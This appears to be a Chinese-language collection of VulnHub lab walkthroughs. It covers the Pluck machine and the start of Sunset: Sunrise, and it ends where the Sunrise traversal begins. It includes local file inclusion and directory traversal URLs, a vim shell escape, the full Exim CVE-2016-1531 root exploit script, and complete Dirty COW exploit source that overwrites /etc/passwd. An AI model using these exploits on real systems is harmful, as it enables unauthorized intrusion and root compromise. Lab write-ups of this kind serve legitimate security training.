 - Download (Mirror): https://download.vulnhub.com/pluck/pluck.ova.zip
 - Download (Torrent): https://download.vulnhub.com/pluck/pluck.ova.zip.torrent

#### 描述

“享受” --- @ryanoberto



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.121
Host is up (0.00016s latency).
MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -sV -p- -v 192.168.56.121
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
```

``` bash
root@kali:~# nmap -A -p 22,80,3306,5355 -v 192.168.56.121 -T4 --script=vuln
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.121
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.121:80/admin.php
|     Form id: 
|     Form action: admin.php
|     
|     Path: http://192.168.56.121:80/index.php?page=contact.php
|     Form id: message
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin.php: Possible admin folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| http-passwd: Directory traversal found.
| Payload: "%2F%2Fetc%2Fpasswd"
| Printing first 250 bytes:
| <!DOCTYPE html>
| <html lang="en">
| <head>
| <meta charset="utf-8">
| <meta http-equiv="X-UA-Compatible" content="IE=edge">
| <meta name="viewport" content="width=device-width, initial-scale=1">
| <title>Pluck</title>
|_<link rel="stylesheet" href="/css/bootstrap
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.121:80/search?forcedict=resolve%27%20OR%20sqlspider&q=define%2bresolve&ved=0ahUKEwiK9crGrc3RAhXpCsAKHYomC50Q_SoISDAA&sa=X
|     http://192.168.56.121:80/search?forcedict=resolve&q=define%2bresolve%27%20OR%20sqlspider&ved=0ahUKEwiK9crGrc3RAhXpCsAKHYomC50Q_SoISDAA&sa=X
|     http://192.168.56.121:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.121:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|   Possible sqli for forms:
|     Form at path: /admin.php, form's action: admin.php. Fields that might be vulnerable:
|_      email
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql   MySQL (unauthorized)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
5355/tcp open  llmnr?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

端口80上的网站由PHP驱动，尝试了许多PHP技巧来检查漏洞，并发现该网站容易受到LFI和PHP base64-encode技巧的攻击！

``` bash
http://192.168.56.121/index.php?page=/etc/passwd
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub242.jpg)

现在得到了一个用户列表：

 - bob
 - peter
 - paul
 - backup-user

确实尝试过暴力破解，SQLi的管理员登录页面，但是运气不太好。

接下来，返回到用户列表，并尝试包含备份用户登录shell中提到的备份脚本。

``` bash
http://192.168.56.121/index.php?page=/usr/local/scripts/backup.sh

#!/bin/bash ######################## # Server Backup script # ######################## #Backup directories in /backups so we can get it via tftp echo "Backing up data" tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null echo "Backup complete" 
```

可以尝试包含tar文件，但这将是一团糟！因此，利用PHP base64编码技巧，通过对backup.tar文件的数据进行编码，然后剪切周围的HTML并在本地对其进行解码，来安全地下载文件。

``` bash
root@kali:~/vulnhub/pluck-1# curl http://192.168.56.121/index.php?page=php://filter/convert.base64-encode/resource=/backups/backup.tar | grep 'jumbotron>' | cut -d '>' -f 2 | cut -d '<' -f 1 > backup.tar64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2361k    0 2361k    0     0  32.0M      0 --:--:-- --:--:-- --:--:-- 32.0M
root@kali:~/vulnhub/pluck-1# ls
backup.tar64
```

base64解码生成backup.tar

``` bash
root@kali:~/vulnhub/pluck-1# base64 -d backup.tar64 > backup.tar
root@kali:~/vulnhub/pluck-1# ls
backup.tar  backup.tar64
```

最后进行解压缩操作

``` bash
root@kali:~/vulnhub/pluck-1# mkdir backup ; tar -xvf backup.tar -C backup
home/
home/bob/
home/bob/.bashrc
home/bob/.sudo_as_admin_successful
home/bob/.profile
home/bob/.bash_logout
home/paul/
home/paul/keys/
home/paul/keys/id_key3.pub
home/paul/keys/id_key2.pub
home/paul/keys/id_key2
home/paul/keys/id_key4.pub
home/paul/keys/id_key5.pub
home/paul/keys/id_key6
home/paul/keys/id_key1
home/paul/keys/id_key5
home/paul/keys/id_key1.pub
home/paul/keys/id_key6.pub
home/paul/keys/id_key4
home/paul/keys/id_key3
home/paul/.bashrc
home/paul/.profile
home/paul/.bash_logout
home/peter/
home/peter/.bashrc
home/peter/.profile
home/peter/.bash_logout
var/www/html/
var/www/html/fonts/
var/www/html/fonts/glyphicons-halflings-regular.svg
var/www/html/fonts/glyphicons-halflings-regular.woff2
var/www/html/fonts/glyphicons-halflings-regular.ttf
var/www/html/fonts/glyphicons-halflings-regular.woff
var/www/html/fonts/glyphicons-halflings-regular.eot
var/www/html/about.php
var/www/html/index.php
var/www/html/footer.php
var/www/html/css/
var/www/html/css/bootstrap.css.map
var/www/html/css/bootstrap.min.css.map
var/www/html/css/bootstrap-theme.css
var/www/html/css/bootstrap-theme.min.css
var/www/html/css/bootstrap.min.css
var/www/html/css/bootstrap-theme.min.css.map
var/www/html/css/bootstrap-theme.css.map
var/www/html/css/bootstrap.css
var/www/html/header.php
var/www/html/admin.php
var/www/html/js/
var/www/html/js/jquery.min.js
var/www/html/js/bootstrap.js
var/www/html/js/npm.js
var/www/html/js/bootstrap.min.js
root@kali:~/vulnhub/pluck-1# ls
backup  backup.tar  backup.tar64
```

解压缩文件后，注意到存在包含用户Paul SSH密钥的keys文件夹，将测试这些密钥，直到获得有效的SSH登录密匙

``` bash
root@kali:~/vulnhub/pluck-1/backup/home/paul/keys# ssh paul@192.168.56.121 -i id_key4
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub243.jpg)

在这种情况下，看到的是菜单类型的Shell登录，但是可以通过选择Edit file并输入任何文件名来退出该菜单，以开始使用vim。

输入下面的vim命令来设置shell

``` bash
:set shell=/bin/bash
```

然后输入以下内容以跳至Bash shell

``` bash
:shell
```

成功获取了shell

``` bash
root@kali:~/vulnhub/pluck-1/backup/home/paul/keys# ssh paul@192.168.56.121 -i id_key4                                      
Last login: Thu Apr  9 07:55:00 2020 from 192.168.56.1

paul@pluck:~$ id
uid=1002(paul) gid=1002(paul) groups=1002(paul)
paul@pluck:~$ whoami
paul
paul@pluck:~$
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub244.jpg)

#### 提权

尝试使用内核漏洞进行提权，但是运气不好，但是在搜索SUID之后，可以注意到exim agent的存在。

``` bash
paul@pluck:~$ find / -perm -u=s -type f 2>/dev/null
/usr/exim/bin/exim-4.84-7                                                                                                  
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/s-nail/s-nail-privsep
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
```

尝试了一些漏洞利用exim代理来提升权限，但不起作用，但是决定尝试一下此漏洞，因为版本差异很小，幸运的是，此漏洞起作用。

 - [Exim-4.84-3-Local-Privilege-Escalation](https://www.exploit-db.com/exploits/39535)

exploitation

``` bash
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

提权过程脚本内容

``` bash
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;
system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

提权，成功获取到了flag

``` bash
aul@pluck:~$ cat > /tmp/root.pm << EOF
> package root;
> use strict;
> use warnings;
> system("/bin/sh");
> EOF
paul@pluck:~$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
# id
uid=0(root) gid=1002(paul) groups=1002(paul)
# whoami
root
# cd /root
# ls
flag.txt
# cat flag.txt

Congratulations you found the flag

---------------------------------------

######   ((((((((((((((((((((((((((((((
#########   (((((((((((((((((((((((((((
,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                     
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                    
@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub245.jpg)

#### 提权2

 - [Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法](https://www.exploit-db.com/exploits/40847)

脏牛提权

40847.cpp

``` bash
// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically do "echo 0 > /proc/sys/vm/dirty_writeback_centisecs")
//
// -----------------------------------------------------------------
// Copyright (C) 2016  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <pty.h>
#include <string.h>
#include <termios.h>
#include <sys/wait.h>
#include <signal.h>

#define  BUFFSIZE    1024
#define  PWDFILE     "/etc/passwd"
#define  BAKFILE     "./.ssh_bak"
#define  TMPBAKFILE  "/tmp/.ssh_bak"
#define  PSM         "/proc/self/mem"
#define  ROOTID      "root:"
#define  SSHDID      "sshd:"
#define  MAXITER     300
#define  DEFPWD      "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"
#define  TXTPWD      "dirtyCowFun\n"
#define  DISABLEWB   "echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n"
#define  EXITCMD     "exit\n"
#define  CPCMD       "cp "
#define  RMCMD       "rm "

using namespace std;

class Dcow{
    private:
       bool              run,        rawMode,     opShell,   restPwd;
       void              *map;
       int               fd,         iter,        master,    wstat;
       string            buffer,     etcPwd,      etcPwdBak,
                         root,       user,        pwd,       sshd;
       thread            *writerThr, *madviseThr, *checkerThr;
       ifstream          *extPwd;
       ofstream          *extPwdBak;
       struct passwd     *userId;
       pid_t             child;  
       char              buffv[BUFFSIZE];
       fd_set            rfds;
       struct termios    termOld,    termNew;
       ssize_t           ign;

       void exitOnError(string msg);
    public:
       Dcow(bool opSh, bool rstPwd);
       ~Dcow(void);
       int  expl(void);         
};

Dcow::Dcow(bool opSh, bool rstPwd) : run(true), rawMode(false), opShell(opSh), restPwd(rstPwd),
                   iter(0), wstat(0), root(ROOTID), pwd(DEFPWD), sshd(SSHDID), writerThr(nullptr),
                   madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), 
                   child(0){ 
   userId = getpwuid(getuid());
   user.append(userId->pw_name).append(":");
   extPwd = new ifstream(PWDFILE);   
   while (getline(*extPwd, buffer)){
       buffer.append("\n");
       etcPwdBak.append(buffer);
       if(buffer.find(root) == 0){
          etcPwd.insert(0, root).insert(root.size(), pwd);
          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), 
                        buffer.begin() + buffer.find(":", root.size()), buffer.end());
       }else if(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 ){
          etcPwd.insert(0, buffer);
       }else{
          etcPwd.append(buffer);
       }
   }
   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);
   extPwdBak->write(etcPwdBak.c_str(), etcPwdBak.size());
   extPwdBak->close();
   fd = open(PWDFILE,O_RDONLY);
   map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);
}

Dcow::~Dcow(void){
   extPwd->close();
   close(fd);
   delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr;
   if(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &termOld);
   if(child != 0) wait(&wstat); 
}

void Dcow::exitOnError(string msg){
      cerr << msg << endl;
      // if(child != 0) kill(child, SIGKILL);
      throw new exception();
}

int  Dcow::expl(void){
   madviseThr = new thread([&](){ while(run){ madvise(map, etcPwdBak.size(), MADV_DONTNEED);} });
   writerThr  = new thread([&](){ int fpsm = open(PSM,O_RDWR);  
                                  while(run){ lseek(fpsm, reinterpret_cast<off_t>(map), SEEK_SET); 
                                              ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); }
                                });
   checkerThr = new thread([&](){ while(iter <= MAXITER){ 
                                         extPwd->clear(); extPwd->seekg(0, ios::beg); 
                                         buffer.assign(istreambuf_iterator<char>(*extPwd),
                                                       istreambuf_iterator<char>());
                                         if(buffer.find(pwd) != string::npos && 
                                            buffer.size() >= etcPwdBak.size()){
                                                run = false; break;
                                         }
                                         iter ++; usleep(300000);
                                   }
                                   run = false;
                                 });

  cerr << "Running ..." << endl;
  madviseThr->join();
  writerThr->join();
  checkerThr->join();

  if(iter <= MAXITER){ 
       child = forkpty(&master, nullptr, nullptr, nullptr);

       if(child == -1) exitOnError("Error forking pty.");

       if(child == 0){ 
          execlp("su", "su", "-", nullptr);
          exitOnError("Error on exec.");
       }

       if(opShell) cerr << "Password overridden to: " <<  TXTPWD << endl;
       memset(buffv, 0, BUFFSIZE);
       ssize_t bytes_read = read(master, buffv, BUFFSIZE - 1);
       if(bytes_read <= 0) exitOnError("Error reading  su prompt.");
       cerr << "Received su prompt (" << buffv << ")" << endl; 

       if(write(master, TXTPWD, strlen(TXTPWD)) <= 0) 
            exitOnError("Error writing pwd on tty.");

       if(write(master, DISABLEWB, strlen(DISABLEWB)) <= 0) 
            exitOnError("Error writing cmd on tty.");

       if(!opShell){
            if(write(master, EXITCMD, strlen(EXITCMD)) <= 0) 
                 exitOnError("Error writing exit cmd on tty.");
       }else{
           if(restPwd){
               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(" ").append(PWDFILE).append("\n");
               if(write(master, restoreCmd.c_str(), restoreCmd.size()) <= 0) 
                    exitOnError("Error writing restore cmd on tty.");
               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append("\n");
               if(write(master, restoreCmd.c_str(), restoreCmd.size()) <= 0) 
                    exitOnError("Error writing restore cmd (rm) on tty.");
           }

           if(tcgetattr(STDIN_FILENO, &termOld) == -1 )
                exitOnError("Error getting terminal attributes.");
    
           termNew               = termOld;
           termNew.c_lflag       &= static_cast<unsigned long>(~(ICANON | ECHO));
    
           if(tcsetattr(STDIN_FILENO, TCSANOW, &termNew) == -1)
                exitOnError("Error setting terminal in non-canonical mode.");
           rawMode = true;
    
           while(true){
                FD_ZERO(&rfds);
                FD_SET(master, &rfds);
                FD_SET(STDIN_FILENO, &rfds);
    
                if(select(master + 1, &rfds, nullptr, nullptr, nullptr) < 0 )
                    exitOnError("Error on select tty.");
    
                if(FD_ISSET(master, &rfds)) {
                    memset(buffv, 0, BUFFSIZE);
                    bytes_read = read(master, buffv, BUFFSIZE - 1);
                    if(bytes_read <= 0) break;
                    if(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)
                          exitOnError("Error writing on stdout.");
                }
    
                if(FD_ISSET(STDIN_FILENO, &rfds)) {
                    memset(buffv, 0, BUFFSIZE);
                    bytes_read = read(STDIN_FILENO, buffv, BUFFSIZE - 1);
                    if(bytes_read <= 0) exitOnError("Error reading from stdin.");
                    if(write(master, buffv, bytes_read) != bytes_read) break;
                }
            }
      }
  }
 
  return [](int ret, bool shell){ 
       string msg = shell ? "Exit.\n" : string("Root password is:   ") + TXTPWD + "Enjoy! :-)\n";
       if(ret <= MAXITER){cerr << msg; return 0;}
       else{cerr << "Exploit failed.\n"; return 1;} 
  }(iter, opShell);
}

void printInfo(char* cmd){
      cerr << cmd << " [-s] [-n] | [-h]\n" << endl;
      cerr << " -s  open directly a shell, if the exploit is successful;" << endl;
      cerr << " -n  combined with -s, doesn't restore the passwd file." << endl;
      cerr << " -h  print this synopsis;" << endl;
      cerr << "\n If no param is specified, the program modifies the passwd file and exits." << endl;
      cerr << " A copy of the passwd file will be create in the current directory as .ssh_bak" << endl;
      cerr << " (unprivileged user), if no parameter or -n is specified.\n" << endl;
      exit(1);
}

int main(int argc, char** argv){
   const char  flags[]   = "shn";
   int         c;
   bool        opShell   = false,
               restPwd   = true;

   opterr = 0;
   while ((c = getopt(argc, argv, flags)) != -1){
      switch (c){
         case 's':
            opShell = true;
         break;
         case 'n':
            restPwd = false;
         break;
         case 'h':
            printInfo(argv[0]);
         break;
         default:
            cerr << "Invalid parameter." << endl << endl;
            printInfo(argv[0]);
      }
   }

   if(!restPwd && !opShell){
            cerr << "Invalid parameter: -n requires -s" << endl << endl;
            printInfo(argv[0]);
   }

   Dcow dcow(opShell, restPwd);
   return dcow.expl();
}
```

<font color="red">***此外UDP69端口开放也可以使用tftp下载backup.tar文件***</font>

#### 知识点总结

 - 文件包含
 - php://filter/convert.base64-encode协议加密传输下载文件
 - ssh key 登录shell
 - vim命令设置shell并跳至shell
 - Exim-4.84-3-本地提权
 - 脏牛提权(dirty cow)
 - udp66端口tftp文件下载

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end pluck-1 -->

</details>

<a id="case-sunset-sunrise"></a>

## Weborf 读取与 Wine 执行

路径读取恢复系统材料，原文分别验证口令路径和 sudo Wine 的可执行文件路径。两条结果保留各自前提。

<p class="kb-provenance">来源 sunset-sunrise · 原记录 2019-12-24 · 20 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-sunset-sunrise">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start sunset-sunrise -->

名称：日落：日出
发布日期：2019年12月6日

下载：
 - Download: https://mega.nz/#!IKQQ2SxZ!anBsBnlQrYh2ELYWYa1mHYKG_7kRw402zfo2WOOB8Z0
 - Download (Mirror): https://download.vulnhub.com/sunset/sunrise.7z
 - Download (Torrent): https://download.vulnhub.com/sunset/sunrise.7z.torrent

描述：

说明：玩得开心！
难度：初学者
联系人：@whitecr0wz



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.104
Host is up (0.00027s latency).
MAC Address: 08:00:27:67:12:DE (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -A -v -sS -sV -Pn -T5 -p- --script=vuln 192.168.56.104
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http       Apache httpd 2.4.38
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /: Root directory w/ listing on 'apache/2.4.38 (debian)'
|_http-server-header: Apache/2.4.38 (Debian)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider
|_    http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3306/tcp open  mysql?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.56.102' is not allowed to connect to this MariaDB server
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http-proxy Weborf (GNU/Linux)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)
|     Content-Length: 202
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>Weborf</title></head><body> <H1>Error 404</H1>Page not found <p>Generated by Weborf/0.12.2 (GNU/Linux)</p></body></html>
|   GetRequest: 
|     HTTP/1.1 200
|     Server: Weborf (GNU/Linux)
|     Content-Length: 326
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>Weborf</title></head><body><table><tr><td></td><td>Name</td><td>Size</td></tr><tr style="background-color: #DFDFDF;"><td>d</td><td><a href="html/">html/</a></td><td>-</td></tr>
|     </table><p>Generated by Weborf/0.12.2 (GNU/Linux)</p></body></html>
|   HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 200
|     Server: Weborf (GNU/Linux)
|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE
|     DAV: 1,2
|     DAV: <http://apache.org/dav/propset/fs/1>
|     MS-Author-Via: DAV
|   Socks5: 
|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)
|     Content-Length: 199
|     Content-Type: text/html
|_    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>Weborf</title></head><body> <H1>Error 400</H1>Bad request <p>Generated by Weborf/0.12.2 (GNU/Linux)</p></body></html>
| http-enum: 
|   /../../../../../../../../../../etc/passwd: Possible path traversal in URI
|   /../../../../../../../../../../boot.ini: Possible path traversal in URI
|_  /html/: Potentially interesting folder
|_http-server-header: Weborf (GNU/Linux)
```

访问http://192.168.56.104:8080/，发现是Weborf/0.12.2

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub95.jpg)

现在使用searchsploit搜索Weborf。 如果没有成功，尝试其他方法。 但是成功了。 说此版本的Weborf容易受到目录遍历攻击。 下载漏洞利用程序的内容，以获取相关信息。 漏洞利用提供了一条易受攻击的方法。 尝试一下。

``` bash
root@kali:~# searchsploit Weborf 0.12.2
-------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------- ----------------------------------------
weborf 0.12.2 - Directory Traversal                           | exploits/linux/remote/14925.txt
-------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~# searchsploit -m 14925
  Exploit: weborf 0.12.2 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14925
     Path: /usr/share/exploitdb/exploits/linux/remote/14925.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /root/14925.txt


root@kali:~# cat 14925.txt 
Title: Weborf httpd <= 0.12.2 Directory Traversal Vulnerability
Date: Sep 6, 2010
Author: Rew
Link: http://galileo.dmi.unict.it/wiki/weborf/doku.php
Version: 0.12.2
Tested On: Debian 5
CVE: N/A

=============================================================

Weborf httpd <= 0.12.2 suffers a directory traversal
vulnerability.  This vulnerability could allow
attackers to read arbitrary files and hak th3 plan3t.

instance.c : line 240-244
------------------------------
void modURL(char* url) {
    //Prevents the use of .. to access the whole filesystem  <-- ORLY?
    strReplace(url,"../",'\0');

    replaceEscape(url);
------------------------------

Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

==============================================================

Stay safe,
Over and Outr
```

按照exp中的利用方法构造如下poc并访问

``` bash
http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub96.jpg)

现在，能在目标计算机内四处查找文件。 决定在用户Sunrise的主目录中进行文件查看。 遇到了一个user.txt文件。

``` bash
http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f
```

